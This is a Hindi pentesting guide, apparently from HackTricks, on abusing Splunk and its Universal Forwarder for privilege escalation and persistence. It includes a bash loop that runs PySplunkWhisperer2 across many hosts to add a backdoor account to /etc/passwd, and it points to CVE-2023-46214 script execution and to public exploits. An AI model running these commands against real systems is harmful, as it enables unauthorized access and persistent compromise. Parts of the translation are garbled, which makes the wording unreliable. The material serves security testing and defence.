# स्प्लंक LPE और स्थिरता

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सदस्यता योजनाएं देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** द्वारा **पीआर जमा करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

यदि आप किसी मशीन को **आंतरिक** या **बाह्य रूप से जाँचते** समय **Splunk चल रहा है** (पोर्ट 8090), और यदि आपके पास **किसी वैध क्रेडेंशियल्स** का ज्ञान है, तो आप **Splunk सेवा का दुरुपयोग** करके **उस उपयोगकर्ता के रूप में एक शैल** को **चला सकते हैं** जो Splunk चला रहा है। यदि यह root द्वारा चलाया जा रहा है, तो आप विशेषाधिकारों को root के रूप में उन्नत कर सकते हैं।

इसके अलावा, यदि आप **पहले से ही root हैं और Splunk सेवा केवल localhost पर सुन रही नहीं है**, तो आप Splunk सेवा से **पासवर्ड** फ़ाइल **चुरा सकते हैं** और **पासवर्ड क्रैक** कर सकते हैं, या उसमें **नए क्रेडेंशियल्स जोड़ सकते हैं**। और मेजबान पर स्थिरता बनाए रख सकते हैं।

पहली छवि में नीचे आप देख सकते हैं कि एक Splunkd वेब पृष्ठ कैसा दिखता है।

## स्प्लंक यूनिवर्सल फॉरवर्डर एजेंट शोषण सारांश

**अधिक विवरण के लिए पोस्ट देखें [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)**

**शोषण अवलोकन:**
Splunk यूनिवर्सल फॉरवर्डर एजेंट (UF) को लक्षित करने वाला एक शोषण अटैक अटैकर्स को एजेंट पासवर्ड के साथ सिस्टम पर विचित्र कोड को निषेधित करने की अनुमति देता है, जिससे पूरी नेटवर्क को कंप्रमाइज किया जा सकता है।

**मुख्य बिंदु:**
- UF एजेंट आने वाली कनेक्शनों या कोड की प्रामाणिकता की पुष्टि नहीं करता है, जिससे अनधिकृत कोड निषेध करने के लिए विकल्पशील हो जाता है।
- सामान्य पासवर्ड प्राप्ति विधियों में उन्हें नेटवर्क निर्देशिकाओं, फ़ाइल साझाकरण या आंतरिक प्रलेखन में ढूंढना शामिल है।
- सफल शोषण संक्रमित होस्ट पर SYSTEM या रूट स्तर की पहुंच, डेटा निकासीकरण और आगे की नेटवर्क घुसपैठ की ओर ले जा सकता है।

**शोषण क्रियान्वयन:**
1. हमलावर UF एजेंट पासवर्ड प्राप्त करता है।
2. एजेंट्स को कमांड या स्क्रिप्ट भेजने के लिए Splunk API का उपयोग करता है।
3. संभावित क्रियाएँ फ़ाइल निकासी, उपयोगकर्ता खाता प्रबंधन और सिस्टम कंप्रमाइज शामिल हैं।

**प्रभाव:**
- प्रत्येक होस्ट पर SYSTEM/root स्तर की अनुमतियों के साथ पूरी नेटवर्क कंप्रमाइज।
- पकड़ने से बचने के लिए लॉगिंग को निषेधित करने की संभावना।
- बैकडोअर्स या रैंसमवेयर की स्थापना।

**शोषण के लिए उदाहरण कमांड:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
## Splunk LPE और Persistence

**उपयोगी सार्वजनिक उत्पाद:**
* [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
* [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
* [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Splunk क्वेरी का दुरुपयोग

**अधिक विवरण के लिए पोस्ट देखें [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

**CVE-2023-46214** ने **`$SPLUNK_HOME/bin/scripts`** में एक विचित्र स्क्रिप्ट अपलोड करने की अनुमति दी और फिर बताया कि खोज क्वेरी **`|runshellscript script_name.sh`** का उपयोग करके वहाँ संग्रहित **स्क्रिप्ट** को **क्रियान्वित** करना संभव था।
